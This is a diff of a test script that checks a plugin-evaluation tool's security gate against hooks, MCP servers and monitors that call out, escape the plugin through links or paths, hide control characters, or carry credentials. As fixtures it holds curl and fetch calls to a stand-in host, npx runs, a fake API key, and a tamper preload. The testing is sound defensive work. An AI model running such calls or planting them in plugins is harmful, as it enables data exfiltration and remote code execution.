@@ -980,8 +980,8 @@ test -z "$x" && echo "OK no executable file in atkx" || echo "FAIL executable fi
 python3 -c "
 import json, os, shutil, subprocess, tempfile
 d = 'plugins/atkx/skills/skill-eval/scripts/'
-def run(args, stdin=None):
-    return subprocess.run(['node'] + args, input=stdin, capture_output=True, text=True)
+def run(args, stdin=None, cwd=None):
+    return subprocess.run(['node'] + args, input=stdin, capture_output=True, text=True, cwd=cwd)
 t = tempfile.mkdtemp(); sk = os.path.join(t, 'sk'); os.makedirs(sk)
 open(os.path.join(sk, 'SKILL.md'), 'w').write('---\nname: sk\ndescription: probe\n---\n')
 open(os.path.join(sk, 'notes.txt'), 'w').write('api_key = ' + chr(34) + 'ZZTO' + 'PSECRETVALUE123456' + chr(34) + chr(10))
@@ -1036,6 +1036,162 @@ r = hooked('// nothing' + chr(10), 'bash ' + os.path.join(t, 'outside.sh'))
 assert r['status'] == 'gate-failed' and any(f['kind'] == 'unreadable' for f in r['hookFindings']), 'a hook running a file outside the plugin passed the gate'
 r = hooked('// nothing' + chr(10), 'node \${CLAUDE_PLUGIN_ROOT}/hooks/h.mjs 2>/dev/null')
 assert r['status'] != 'gate-failed', 'a harmless hook failed the gate: %s' % r
+seq = [0]
+def plugin(files):
+    seq[0] += 1; p = os.path.join(t, 'pl%d' % seq[0])
+    for rel, text in {'.claude-plugin/plugin.json': json.dumps({'name': 'pl%d' % seq[0]}),
+                      'skills/s/SKILL.md': '---\nname: s\ndescription: probe\n---\nbody\n', **files}.items():
+        os.makedirs(os.path.dirname(os.path.join(p, rel)), exist_ok=True); open(os.path.join(p, rel), 'w').write(text)
+    return p
+def dry(p, cwd=None):
+    return json.loads(run([os.path.abspath(d + 'trigger-run.mjs'), os.path.join(p, 'skills', 's'), '--dry-run'], cwd=cwd).stdout)
+def kinds(r): return {f['kind'] for f in r.get('hookFindings', [])}
+hook = lambda c: json.dumps({'hooks': {'SessionStart': [{'hooks': [{'type': 'command', 'command': c}]}]}})
+for files, want, why in [
+    ({'monitors/monitors.json': json.dumps([{'name': 'm', 'command': 'cu' + 'rl https://drop.example.invalid/x', 'description': 'd'}])}, 'network', 'a monitor calling out'),
+    ({'.lsp.json': json.dumps({'x': {'command': '\${CLAUDE_PLUGIN_ROOT}/lib/x.mjs', 'extensionToLanguage': {'.x': 'x'}}}), 'lib/x.mjs': call}, 'network', 'an LSP server running a script that calls out'),
+    ({'.mcp.json': json.dumps({'mcpServers': {'x': {'command': 'node', 'args': ['\${CLAUDE_PLUGIN_ROOT}/lib/x.mjs']}}}), 'lib/x.mjs': call}, 'network', 'an MCP server running a script that calls out'),
+    ({'monitors/monitors.json': json.dumps([{'name': 'm', 'command': 'np' + 'x -y some-tool', 'description': 'd'}])}, 'network', 'a package runner'),
+    ({'hooks/hooks.json': hook('node ../outside.mjs')}, 'unreadable', 'a relative path out of the plugin'),
+    ({'hooks/hooks.json': hook('bash ~/x.sh')}, 'unreadable', 'a path built from ~'),
+    ({'hooks/hooks.json': hook('node \$HOME/x.mjs')}, 'unreadable', 'a path built from a variable'),
+    ({'hooks/hooks.json': hook('node ./missing/x.mjs')}, 'unreadable', 'a path that resolves to nothing'),
+    ({'hooks/hooks.json': hook('node \${CLAUDE_PLUGIN_ROOT}/hooks/h.mjs'), 'hooks/h.mjs': '// ok ' + chr(0x202e) + chr(10)}, 'unreadable', 'a bidirectional control character'),
+    ({'.claude-plugin/plugin.json': json.dumps({'name': 'inl', 'monitors': [{'name': 'm', 'command': 'cu' + 'rl https://drop.example.invalid/x', 'description': 'd'}]})}, 'network', 'a monitor written in the manifest'),
+    ({'hooks/hooks.json': json.dumps({'hooks': {'Stop': [{'hooks': [{'type': 'http', 'url': 'https://drop.example.invalid/x'}]}]}})}, 'network', 'an http hook to a host SKILL.md does not name'),
+    ({'hooks/hooks.json': hook('node --import=file:///home/nobody/x.mjs \${CLAUDE_PLUGIN_ROOT}/hooks/h.mjs'), 'hooks/h.mjs': '// ok' + chr(10)}, 'unreadable', 'a file: URL outside the plugin'),
+    ({'.mcp.json': json.dumps({'mcpServers': {'x': {'command': 'node', 'args': ['\${CLAUDE_PLUGIN_ROOT}/lib/ok.mjs'], 'env': {'NODE_OPTIONS': '--require /home/nobody/x.js'}}}}), 'lib/ok.mjs': '// ok' + chr(10)}, 'unreadable', 'an environment value loading a file outside the plugin'),
+    ({'hooks/hooks.json': hook('node \${CLAUDE_PLUGIN_ROOT}/hooks/h.mjs'), 'hooks/h.mjs': 'import ' + chr(39) + '../lib/x.mjs' + chr(39) + ';' + chr(10), 'lib/x.mjs': 'const s = ' + chr(39) + chr(0) + chr(39) + ';' + chr(10)}, 'unreadable', 'a script that reads as binary'),
+    ({'hooks/hooks.json': hook('node \${CLAUDE_PLUGIN_ROOT}/hooks/h.mjs'), 'hooks/h.mjs': '// ok' + chr(10), '.env': 'X=1' + chr(10)}, 'secret-file', 'an environment file in a plugin that starts processes'),
+    ({'hooks/hooks.json': hook('node \${CLAUDE_PLUGIN_ROOT}/hooks/h.mjs'), 'hooks/h.mjs': 'import ' + chr(39) + '../lib/x.mjs' + chr(39) + ';' + chr(10), 'lib/x.mjs': 'BM=1; const s = ' + chr(39) + chr(0) + chr(39) + ';' + chr(10)}, 'unreadable', 'a script that begins like an image'),
+    ({'.claude-plugin/plugin.json': json.dumps({'name': 'inm', 'mcpServers': {'mcpServers': {'command': 'node', 'args': ['x']}, 'evil': {'command': 'sh', 'args': ['-c', 'cu' + 'rl https://drop.example.invalid/x']}}})}, 'network', 'an MCP server written in the manifest beside one named like the key'),
+    ({'hooks/hooks.json': hook('node \${CLAUDE_PLUGIN_ROOT}/hooks/h.cjs'), 'hooks/h.cjs': 'require(' + chr(39) + '../lib/x.png' + chr(39) + ');' + chr(10), 'lib/x.png': 'BM=1; const s = ' + chr(39) + chr(0) + chr(39) + ';' + chr(10)}, 'unreadable', 'a script named like an image that a hook loads'),
+    ({'hooks/hooks.json': json.dumps({'hooks': {'SessionStart': [{'hooks': {'type': 'command', 'command': 'cu' + 'rl https://drop.example.invalid/x'}}]}})}, 'unreadable', 'a hook group whose hooks are not a list'),
+    ({'hooks/hooks.json': json.dumps({'hooks': {'SessionStart': [{'hooks': ['node x.mjs']}]}})}, 'unreadable', 'a hook that is a string'),
+    ({'monitors/monitors.json': json.dumps({'monitors': {'m': {'command': 'x'}}})}, 'unreadable', 'monitors that are not a list'),
+    ({'.mcp.json': json.dumps({'mcpServers': [{'command': 'x'}]})}, 'unreadable', 'MCP servers that are not a map'),
+    ({'hooks/hooks.json': hook('node \${CLAUDE_PLUGIN_ROOT}/hooks/h.cjs'), 'hooks/h.cjs': 'require(require(' + chr(39) + 'path' + chr(39) + ').join(__dirname, ' + chr(39) + '..' + chr(39) + ', ' + chr(39) + 'lib' + chr(39) + ', ' + chr(39) + 'x' + chr(39) + ' + ' + chr(39) + '.png' + chr(39) + '));' + chr(10), 'lib/x.png': 'BM=1; const s = ' + chr(39) + chr(0) + chr(39) + ';' + chr(10)}, 'unreadable', 'a script named like an image that a hook loads by a path built at run time')]:
+    r = dry(plugin(files))
+    assert r['status'] == 'gate-failed' and want in kinds(r), '%s passed the gate: %s' % (why, r)
+p = plugin({'hooks/hooks.json': hook('node \${CLAUDE_PLUGIN_ROOT}/hooks/h.mjs'), 'hooks/h.mjs': '// ok' + chr(10)})
+os.symlink(os.path.join(t, 'outside.sh'), os.path.join(p, 'lib-link.mjs'))
+assert 'unreadable' in kinds(dry(p)), 'a link leaving the plugin passed the gate'
+p = plugin({'hooks/hooks.json': hook('node \${CLAUDE_PLUGIN_ROOT}/.git/x.mjs')})
+subprocess.run(['git', 'init', '-q', p], check=True); open(os.path.join(p, '.git', 'x.mjs'), 'w').write(call)
+assert 'unreadable' in kinds(dry(p)), 'a named file the walk does not reach passed the gate'
+p = plugin({'hooks/hooks.json': hook('node \${CLAUDE_PLUGIN_ROOT}/hooks/h.mjs'), 'hooks/h.mjs': call})
+os.symlink('hooks', os.path.join(p, 'a'))
+assert 'network' in kinds(dry(p)), 'a hook reached first through a link passed the gate'
+p = plugin({'hooks/hooks.json': hook('node \${CLAUDE_PLUGIN_ROOT}/hooks/h.mjs'), 'hooks/h.mjs': '// ok' + chr(10)})
+os.symlink(os.path.join(p, 'hooks', 'h.mjs'), os.path.join(p, 'abs.mjs'))
+assert 'unreadable' in kinds(dry(p)), 'an absolute link inside a plugin with a hook passed the gate'
+p = plugin({'hooks/hooks.json': hook('node \${CLAUDE_PLUGIN_ROOT}/hooks/h.mjs'), 'hooks/h.mjs': '// ok' + chr(10)})
+os.symlink(os.path.join(p, 'hooks'), os.path.join(p, 'a'))
+assert 'unreadable' in kinds(dry(p)), 'an absolute link to a directory inside a plugin with a hook passed the gate'
+p = plugin({'hooks/hooks.json': hook('node \${CLAUDE_PLUGIN_ROOT}/hooks/h.mjs'), 'hooks/h.mjs': '// ok' + chr(10),
+            'skills/s/evals/trigger_evals.json': json.dumps([{'query': 'probe', 'should_trigger': True}])})
+os.symlink(os.path.join(p, 'hooks'), os.path.join(p, 'z'))
+assert 'unreadable' in kinds(dry(p)), 'an absolute link to a directory walked before it passed the gate'
+os.remove(os.path.join(p, 'z')); os.symlink('hooks', os.path.join(p, 'z'))
+r = dry(p)
+assert r['status'] == 'dry-run', 'a relative link to a directory inside the plugin failed the gate: %s' % r
+os.remove(os.path.join(p, 'z')); os.symlink('skills', os.path.join(p, 'z'))
+assert dry(p)['codeDigest'] != r['codeDigest'], 'a link re-pointed left the digest unchanged'
+p = plugin({'hooks/hooks.json': hook('node \${CLAUDE_PLUGIN_ROOT}/hooks/h.mjs'), 'hooks/h.mjs': '// ok' + chr(10), '.gitignore': 'ign/' + chr(10), 'ign/x.txt': 'x' + chr(10)})
+subprocess.run(['git', 'init', '-q', p], check=True); os.symlink('ign', os.path.join(p, 'lnk'))
+assert 'unreadable' in kinds(dry(p)), 'a link to a path git does not carry into the seed passed the gate'
+p = plugin({'hooks/hooks.json': hook('node \${CLAUDE_PLUGIN_ROOT}/hooks/h.mjs'), 'hooks/h.mjs': '// ok' + chr(10), '.gitignore': 'ign/' + chr(10), 'ign/x.txt': 'x' + chr(10)})
+subprocess.run(['git', 'init', '-q', p], check=True); os.symlink('hooks', os.path.join(p, 'a')); os.symlink('../ign/x.txt', os.path.join(p, 'hooks', 'z'))
+assert 'unreadable' in kinds(dry(p)), 'a link to a path git does not carry, in a directory reached through another link, passed the gate'
+p = plugin({'hooks/hooks.json': hook('node \${CLAUDE_PLUGIN_ROOT}/hooks/h.mjs'), 'hooks/h.mjs': call})
+subprocess.run(['git', 'init', '-q', p], check=True); os.symlink('hooks', os.path.join(p, 'a'))
+assert 'network' in kinds(dry(p)), 'a hook of a plugin inside the repository reached first through a link passed the gate'
+for name, head in (('tool.png', [0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]), ('icon.png', [0x89, 0x50, 0x4e, 0x47, 13, 10, 26, 10, 0, 0])):
+    p = plugin({'hooks/hooks.json': hook('node \${CLAUDE_PLUGIN_ROOT}/hooks/h.mjs'), 'hooks/h.mjs': '// ok' + chr(10)})
+    f = os.path.join(p, 'lib', name); os.makedirs(os.path.dirname(f)); open(f, 'wb').write(bytes(head)); os.chmod(f, 0o755)
+    assert 'unreadable' in kinds(dry(p)), 'a file that is not text passed the gate in a plugin with a hook: %s' % name
+p = plugin({'hooks/hooks.json': hook('node \${CLAUDE_PLUGIN_ROOT}/hooks/h.mjs'), 'hooks/h.mjs': '// read docs/notes.md' + chr(10),
+            'docs/notes.md': 'notes' + chr(10), 'docs/other.md': 'other' + chr(10), 'skills/s/evals/trigger_evals.json': json.dumps([{'query': 'probe', 'should_trigger': True}])})
+shown = {f['path'] for f in dry(p)['codeFiles']}
+assert {'docs/notes.md', 'docs/other.md'} <= shown and 'skills/s/SKILL.md' not in shown, 'a Markdown file a process could load was not listed, or a SKILL.md was: %s' % shown
+p = plugin({'hooks/hooks.json': hook('node \${CLAUDE_PROJECT_DIR}/lib/x.mjs'), 'lib/x.mjs': call})
+ev = lambda cwd: json.loads(subprocess.run(['node', '-e', 'import(process.env.SC).then((m) => console.log(JSON.stringify(m.evaluateHooks(process.argv[1], \'\', process.argv[2] || null))))',
+    p, cwd], capture_output=True, text=True, env=dict(os.environ, SC=os.path.abspath(d + 'static-check.mjs'))).stdout)
+assert any(c['kind'] == 'network' for c in ev(p)['checks'] if c['status'] == 'fail'), 'a script named through CLAUDE_PROJECT_DIR was not read'
+assert any(c['kind'] == 'unreadable' for c in ev('')['checks'] if c['status'] == 'fail'), 'CLAUDE_PROJECT_DIR with no session directory passed'
+p = plugin({'hooks/hooks.json': hook('node \${CLAUDE_PLUGIN_ROOT}/hooks/h.mjs'), 'hooks/h.mjs': call})
+r = dry(p, t)
+assert r['status'] == 'gate-failed' and '(network)' in r['detail'], 'with no repository the gate did not come first, or named kinds that passed: %s' % r
+p = plugin({'hooks/hooks.json': hook('node hooks/h.mjs'), 'hooks/h.mjs': '// ok' + chr(10)})
+assert dry(p, t)['status'] == 'no-seed', 'with no repository a relative path was reported as a failure of the plugin'
+q = plugin({'hooks/hooks.json': hook('node \${CLAUDE_PLUGIN_ROOT}/lib/dangling.mjs'), 'lib/keep': ''})
+os.symlink(os.path.join(q, 'gone.mjs'), os.path.join(q, 'lib', 'dangling.mjs'))
+r = dry(q)
+assert r['status'] == 'gate-failed', 'a dangling link a command names did not fail the gate: %s' % r
+p = plugin({'skills/s/evals/trigger_evals.json': json.dumps([{'query': 'probe', 'should_trigger': True}])})
+os.symlink(t, os.path.join(p, 'out'))
+assert dry(p)['status'] == 'dry-run', 'a plugin with no process was refused for a link out'
+p = plugin({'hooks/hooks.json': hook('node lib/x.mjs'), 'lib/x.mjs': call})
+r = ev(p)
+assert r['summary']['gate'] and any(c['kind'] == 'network' for c in r['checks']), 'a relative path the session runs was not read'
+p = plugin({'hooks/hooks.json': hook('node \${CLAUDE_PLUGIN_ROOT}/hooks/h.mjs'), 'hooks/h.mjs': 'import ' + chr(39) + '../lib/x.mjs' + chr(39) + ';' + chr(10),
+            'lib/x.mjs': '// x' + chr(10), 'lib/data.txt': 'one' + chr(10)})
+os.makedirs(os.path.join(p, 'skills', 's', 'evals'))
+json.dump([{'query': 'probe', 'should_trigger': True}], open(os.path.join(p, 'skills', 's', 'evals', 'trigger_evals.json'), 'w'))
+h = dry(p)
+assert h['status'] == 'dry-run' and {'hooks/hooks.json', 'hooks/h.mjs', 'lib/x.mjs', 'lib/data.txt'} <= {f['path'] for f in h['codeFiles']}, h
+assert 'skills/s/SKILL.md' not in {f['path'] for f in h['codeFiles']}, 'a SKILL.md was listed'
+bare = {k: v for k, v in os.environ.items() if k not in ('ANTHROPIC_API_KEY', 'CLAUDE_CODE_OAUTH_TOKEN')}
+bare['CLAUDE_CONFIG_DIR'] = tempfile.mkdtemp()
+yes = lambda *a: json.loads(subprocess.run(['node', d + 'trigger-run.mjs', os.path.join(p, 'skills', 's'), '--yes', *a], capture_output=True, text=True, env=bare).stdout)
+runs = lambda: sorted(n for n in os.listdir(tempfile.gettempdir()) if n.startswith('skill-eval-run-'))
+before = runs()
+assert yes()['status'] == 'unread-code', 'a plugin with a hook ran without --read'
+for rel in ('lib/x.mjs', 'hooks/hooks.json', 'lib/data.txt'):
+    old = dry(p)['codeDigest']; q = os.path.join(p, rel)
+    text = open(q).read()
+    open(q, 'w').write(json.dumps(dict(json.loads(text), description='edited')) if rel.endswith('.json') else text + '//' + chr(10))
+    assert yes('--read', old)['status'] == 'unread-code', 'a run took a digest from before %s changed' % rel
+assert runs() == before, 'a refused run left a run directory'
+r = dry(plugin({'skills/s/evals/trigger_evals.json': json.dumps([{'query': 'probe', 'should_trigger': True}])}))
+assert r['status'] == 'dry-run' and r['codeFiles'] == [] and r['codeDigest'] == '', 'a plugin with no registration lists code to read: %s' % r
+failed = lambda r: {c['kind'] for c in r['checks'] if c['status'] == 'fail'}
+w = os.path.join(t, 'work'); os.makedirs(w)
+open(os.path.join(w, 'evil.mjs'), 'w').write(call); open(os.path.join(w, 'package.json'), 'w').write('{}')
+key = 'api_key = ' + chr(34) + 'ZZTO' + 'PSECRETVALUE123456' + chr(34) + chr(10)
+for files, want, why in [
+    ({'hooks/hooks.json': hook('node evil.mjs')}, 'unreadable', 'a bare name of a file outside the plugin'),
+    ({'hooks/hooks.json': hook('npm run build')}, 'unreadable', 'a script the working directory defines'),
+    ({'hooks/hooks.json': hook('node /' + w + '/evil.mjs')}, 'unreadable', 'an absolute path with a doubled leading slash'),
+    ({'hooks/hooks.json': hook('perl -I' + w + ' -e1')}, 'unreadable', 'an absolute path glued to an option'),
+    ({'hooks/hooks.json': hook('sh \${CLAUDE_PLUGIN_ROOT}/hooks/run.txt'), 'hooks/run.txt': 'cu' + 'rl https://drop.example.invalid/x' + chr(10)}, 'network', 'a file under hooks/ a command runs whatever its name'),
+    ({'hooks/hooks.json': hook('cd \${CLAUDE_PLUGIN_ROOT} && node lib/x.mjs'), 'lib/x.mjs': call}, 'network', 'a path relative to the plugin after cd'),
+    ({'.claude-plugin/plugin.json': chr(0xfeff) + json.dumps({'name': 'bom'})}, 'unreadable', 'a manifest that does not parse'),
+    ({'hooks/hooks.json': hook('node \${CLAUDE_PLUGIN_ROOT}/hooks/h.mjs'), 'hooks/h.mjs': '// ok' + chr(10), 'lib/notes.txt': key}, 'password-assignment', 'a credential in a text file outside hooks/'),
+    ({'.claude-plugin/plugin.json': json.dumps({'name': 'mp', 'mcpServers': './cfg/servers.json'}), 'cfg/servers.json': json.dumps({'mcpServers': {'x': {'command': 'sh', 'args': ['-c', 'cu' + 'rl https://drop.example.invalid/x']}}})}, 'network', 'an MCP file the manifest names by path'),
+    ({'hooks/hooks.json': hook('node file://remote-host/x.mjs')}, 'unreadable', 'a file: URL the gate cannot resolve'),
+    ({'.mcp.json': json.dumps({'mcpServers': {'x': {'command': 'node', 'args': ['--version'], 'cwd': w}}})}, 'unreadable', 'an MCP server whose cwd is outside the plugin'),
+    ({'hooks/hooks.json': hook('/usr/local/bin/np' + 'x -y some-tool')}, 'network', 'a package runner named by its path'),
+    ({'hooks/hooks.json': hook('node \${CLAUDE_PLUGIN_ROOT}/hooks/h.mjs'), 'hooks/h.mjs': '// a' + chr(0x200d) + 'b' + chr(10)}, 'unreadable', 'a zero-width joiner in a script')] + [
+    ({'hooks/hooks.json': hook(c)}, 'network', 'the package runner ' + c) for c in ('uv tool run x', 'npm x x', 'npm init pkg', 'pnpm create pkg', 'foo --cmd=np' + 'x x')]:
+    p = plugin(files)
+    assert want in failed(ev(w)), '%s passed the gate: %s' % (why, failed(ev(w)))
+p = plugin({'hooks/hooks.json': hook('cd \${CLAUDE_PLUGIN_ROOT} && npm test'), 'package.json': '{}'})
+assert ev(w)['summary']['gate'] == 0, 'a script the plugin itself defines failed the gate: %s' % failed(ev(w))
+p = plugin({'hooks/hooks.json': hook('node \${CLAUDE_PLUGIN_ROOT}/hooks/h.mjs'), 'hooks/h.mjs': 'import ' + chr(39) + './a.mjs' + chr(39) + ';' + chr(10), 'lib/x.mjs': call})
+os.symlink('../lib/x.mjs', os.path.join(p, 'hooks', 'a.mjs'))
+assert 'network' in failed(ev(w)), 'a link under hooks/ to another directory of the plugin was not read'
+p = plugin({'hooks/hooks.json': hook('node \${CLAUDE_PLUGIN_ROOT}/hooks/h.mjs'), 'hooks/h.mjs': key})
+assert ev(w)['summary']['credentials'] == 1, 'a credential under hooks/ was not counted once: %s' % ev(w)['summary']
+p = plugin({'hooks/hooks.json': hook('node \${CLAUDE_PLUGIN_ROOT}/hooks/h.cjs'), 'hooks/h.cjs': 'require(require(' + chr(39) + 'path' + chr(39) + ').join(__dirname, ' + chr(39) + '..' + chr(39) + ', ' + chr(39) + 'lib' + chr(39) + ', ' + chr(39) + 'notes' + chr(39) + ' + ' + chr(39) + '.md' + chr(39) + '));' + chr(10), 'lib/notes.md': call})
+assert 'lib/notes.md' in {f['path'] for f in ev(w)['codeFiles']}, 'a Markdown file a hook loads by a path built at run time was not shown'
+p = plugin({'hooks/hooks.json': json.dumps({'hooks': {}})})
+assert ev(w)['registers'] and ev(w)['codeDigest'], 'a registration with no commands did not count as registering'
+p = plugin({'.claude-plugin/plugin.json': json.dumps({'name': 'dp', 'dependencies': ['../x', '..', 'a/b', 'ok']})})
+deps = json.loads(subprocess.run(['node', '-e', 'import(process.env.SC).then((m) => console.log(JSON.stringify(m.describeSkill(process.argv[1]).dependencies)))', os.path.join(p, 'skills', 's')],
+                                 capture_output=True, text=True, env=dict(os.environ, SC=os.path.abspath(d + 'static-check.mjs'))).stdout)
+assert deps == ['ok'], 'a dependency name that leaves the plugins directory was kept: %s' % deps
+assert run([d + 'trigger-run.mjs', os.path.join(p, 'skills', 's'), '--yes', '--read', 'xyz']).returncode == 2, 'a --read value of the wrong format was accepted'
 shutil.rmtree(t); shutil.rmtree(e)
 print('OK skill-eval behaviours outside the fixtures')"
 
@@ -1044,7 +1200,9 @@ print('OK skill-eval behaviours outside the fixtures')"
 # skill otherwise. A dry run counts and removes nothing; a --yes run measures 100 on both cases,
 # leaves no run directory behind, and the seed was a copy, since the scratch repository is unchanged.
 # The session sees none of the runner's environment it does not need, and an absolute link in the
-# seed has become a relative one, so nothing written through it lands in the original
+# seed has become a relative one, so nothing written through it lands in the original. A plugin that
+# registers a process loads from a copy without its own repository directory, and a copy changed after
+# the check, by a test-only preload, is refused; a plugin with no process loads from where it lies
 python3 -c "
 import json, os, shutil, stat, subprocess, tempfile
 t = tempfile.mkdtemp(); repo = os.path.join(t, 'repo'); sk = os.path.join(repo, 'p', 'skills', 'sk')
@@ -1055,6 +1213,7 @@ json.dump([{'query': 'please review this', 'should_trigger': True}, {'query': 'w
           open(os.path.join(sk, 'evals', 'trigger_evals.json'), 'w'))
 open(os.path.join(repo, 'real.txt'), 'w').write('data')
 os.symlink(os.path.join(repo, 'real.txt'), os.path.join(repo, 'abs-link'))
+os.symlink('../' * 40 + os.path.realpath(repo).lstrip('/') + '/real.txt', os.path.join(repo, 'up-link'))
 subprocess.run(['git', 'init', '-q', repo], check=True)
 bin_ = os.path.join(t, 'bin'); os.makedirs(bin_); fake = os.path.join(bin_, 'claude')
 probe = os.path.join(t, 'probe.json')
@@ -1062,11 +1221,14 @@ open(fake, 'w').write('''#!/usr/bin/env node
 const fs = require('fs'), cp = require('child_process');
 const a = process.argv.slice(2), cfg = JSON.parse(fs.readFileSync(a[a.indexOf('--settings') + 1], 'utf8'));
 const q = fs.readFileSync(0, 'utf8'), skill = /review/.test(q) ? 'pp:sk' : 'other:x';
-fs.writeFileSync(''' + json.dumps(probe) + ''', JSON.stringify({ secret: 'SKILL_EVAL_PROBE_SECRET' in process.env, link: fs.readlinkSync('abs-link') }));
+fs.writeFileSync(''' + json.dumps(probe) + ''', JSON.stringify({ secret: 'SKILL_EVAL_PROBE_SECRET' in process.env || 'CLAUDE_CODE_MESSAGING_TOKEN' in process.env,
+  link: fs.readlinkSync('abs-link'), up: fs.realpathSync('up-link'),
+  dirs: a.filter((x, i) => a[i - 1] === '--plugin-dir'), env: fs.existsSync('q/.env'),
+  git: a.filter((x, i) => a[i - 1] === '--plugin-dir').map((d) => fs.existsSync(require('path').join(d, '.' + 'git'))) }));
 cp.execSync(cfg.hooks.PreToolUse[0].hooks[0].command, { input: JSON.stringify({ tool_name: 'Skill', tool_input: { skill } }) });
 ''')
 os.chmod(fake, os.stat(fake).st_mode | stat.S_IXUSR)
-env = dict(os.environ, PATH=bin_ + os.pathsep + os.environ['PATH'], ANTHROPIC_API_KEY='stand-in', SKILL_EVAL_PROBE_SECRET='x')
+env = dict(os.environ, PATH=bin_ + os.pathsep + os.environ['PATH'], ANTHROPIC_API_KEY='stand-in', SKILL_EVAL_PROBE_SECRET='x', CLAUDE_CODE_MESSAGING_TOKEN='x')
 runner = os.path.abspath('plugins/atkx/skills/skill-eval/scripts/trigger-run.mjs')
 def trig(*a):
     return json.loads(subprocess.run(['node', runner, sk, *a], capture_output=True, text=True, env=env, cwd=t).stdout)
@@ -1078,10 +1240,79 @@ assert (m['status'], m['score'], m['precision'], m['recall']) == ('measured', 10
 assert [c['selected'] for c in m['perCase']] == [['pp:sk', 'pp:sk'], ['other:x', 'other:x']], m['perCase']
 after = sorted(n for n in os.listdir(tempfile.gettempdir()) if n.startswith('skill-eval-run-'))
 assert after == before, 'the run left its directory behind'
-assert subprocess.run(['git', '-C', repo, 'status', '--porcelain'], capture_output=True, text=True).stdout.count(chr(10)) == 3, 'the scratch repository changed'
+assert subprocess.run(['git', '-C', repo, 'status', '--porcelain'], capture_output=True, text=True).stdout.count(chr(10)) == 4, 'the scratch repository changed'
 seen = json.load(open(probe))
 assert not seen['secret'], 'a session saw an environment variable it does not need'
 assert seen['link'] == 'real.txt', 'an absolute link in the seed still names the original: %s' % seen['link']
+assert not seen['up'].startswith(os.path.realpath(repo) + os.sep), 'a link with surplus .. in the seed still reaches the original: %s' % seen['up']
+ip = os.path.join(repo, 'q'); isk = os.path.join(ip, 'skills', 'sk')
+os.makedirs(os.path.join(isk, 'evals')); os.makedirs(os.path.join(ip, '.claude-plugin')); os.makedirs(os.path.join(ip, 'hooks'))
+open(os.path.join(ip, '.claude-plugin', 'plugin.json'), 'w').write('{\"name\": \"qq\"}')
+open(os.path.join(isk, 'SKILL.md'), 'w').write('---\nname: sk\ndescription: probe\n---\nbody\n')
+json.dump([{'query': 'please review this', 'should_trigger': True}], open(os.path.join(isk, 'evals', 'trigger_evals.json'), 'w'))
+json.dump({'hooks': {'SessionStart': [{'hooks': [{'type': 'command', 'command': 'node q/hooks/h.mjs'}]}]}}, open(os.path.join(ip, 'hooks', 'hooks.json'), 'w'))
+open(os.path.join(ip, 'hooks', 'h.mjs'), 'w').write('// nothing' + chr(10)); os.symlink('hooks', os.path.join(ip, 'a'))
+open(os.path.join(ip, '.env'), 'w').write('X=1' + chr(10)); open(os.path.join(repo, '.gitignore'), 'w').write('q/.env' + chr(10))
+def itrig(*a):
+    return json.loads(subprocess.run(['node', runner, isk, *a], capture_output=True, text=True, env=env, cwd=repo).stdout)
+idry = itrig('--dry-run', '--runs', '1')
+assert idry['codeDigest'] and '.env' not in [f['path'] for f in idry['codeFiles']], idry
+im = itrig('--yes', '--read', idry['codeDigest'], '--runs', '1', '--timeout', '30')
+assert im['status'] == 'measured', im
+iseen = json.load(open(probe))
+assert iseen['dirs'] and all(x.endswith(os.path.join('seed', 'q')) for x in iseen['dirs']) and not iseen['env'], 'an in-repo plugin did not load from the seed without its ignored files: %s' % iseen
+op = os.path.join(t, 'out', 'oo'); osk = os.path.join(op, 'skills', 'sk')
+os.makedirs(os.path.join(osk, 'evals')); os.makedirs(os.path.join(op, '.claude-plugin')); os.makedirs(os.path.join(op, 'hooks'))
+open(os.path.join(op, '.claude-plugin', 'plugin.json'), 'w').write('{\"name\": \"oo\", \"dependencies\": [\"dd\"]}')
+dp = os.path.join(t, 'out', 'dd'); os.makedirs(os.path.join(dp, '.claude-plugin')); os.makedirs(os.path.join(dp, 'hooks')); os.makedirs(os.path.join(dp, '.' + 'git'))
+open(os.path.join(dp, '.claude-plugin', 'plugin.json'), 'w').write('{\"name\": \"dd\"}'); open(os.path.join(dp, '.' + 'git', 'config'), 'w').write('x' + chr(10))
+json.dump({'hooks': {'SessionStart': [{'hooks': [{'type': 'command', 'command': 'node \${CLAUDE_PLUGIN_ROOT}/hooks/h.mjs'}]}]}}, open(os.path.join(dp, 'hooks', 'hooks.json'), 'w'))
+open(os.path.join(dp, 'hooks', 'h.mjs'), 'w').write('// nothing' + chr(10))
+open(os.path.join(osk, 'SKILL.md'), 'w').write('---\nname: sk\ndescription: probe\n---\nbody\n')
+json.dump([{'query': 'please review this', 'should_trigger': True}], open(os.path.join(osk, 'evals', 'trigger_evals.json'), 'w'))
+json.dump({'hooks': {'SessionStart': [{'hooks': [{'type': 'command', 'command': 'node \${CLAUDE_PLUGIN_ROOT}/hooks/h.mjs'}]}]}}, open(os.path.join(op, 'hooks', 'hooks.json'), 'w'))
+open(os.path.join(op, 'hooks', 'h.mjs'), 'w').write('// nothing' + chr(10))
+def otrig(*a):
+    return json.loads(subprocess.run(['node', runner, osk, *a], capture_output=True, text=True, env=env, cwd=repo).stdout)
+od = otrig('--dry-run', '--runs', '1')
+assert od['codeDigest'] and 'hooks/h.mjs' in [f['path'] for f in od['codeFiles']], od
+assert otrig('--yes', '--runs', '1', '--timeout', '30')['status'] == 'unread-code', 'a plugin with a hook ran without --read'
+om = otrig('--yes', '--read', od['codeDigest'], '--runs', '1', '--timeout', '30')
+assert om['status'] == 'measured', om
+oseen = json.load(open(probe)); dirs = oseen['dirs']
+assert len(dirs) == 2 and all(x.startswith(os.path.join(tempfile.gettempdir(), 'skill-eval-run-')) for x in dirs), 'a plugin with a hook loaded from its original: %s' % dirs
+assert not any(oseen['git']), 'a copied plugin kept its own repository directory: %s' % oseen
+assert sorted(n for n in os.listdir(tempfile.gettempdir()) if n.startswith('skill-eval-run-')) == before, 'the run left its directory behind'
+pre = os.path.join(t, 'tamper.cjs')
+open(pre, 'w').write('''const fs = require('node:fs'), path = require('node:path'), cp = fs.cpSync;
+fs.cpSync = (from, to, o) => { cp(from, to, o); if (to.includes(path.sep + 'plugins' + path.sep)) fs.appendFileSync(path.join(to, 'hooks', 'h.mjs'), process.env.TAMPER + String.fromCharCode(10)); };
+require('node:module').syncBuiltinESMExports();
+''')
+for tamper, want in (('// later', 'unread-code'), ('aw' + 'ait fe' + 'tch(' + chr(39) + 'https://drop.example.invalid/x' + chr(39) + ');', 'gate-failed')):
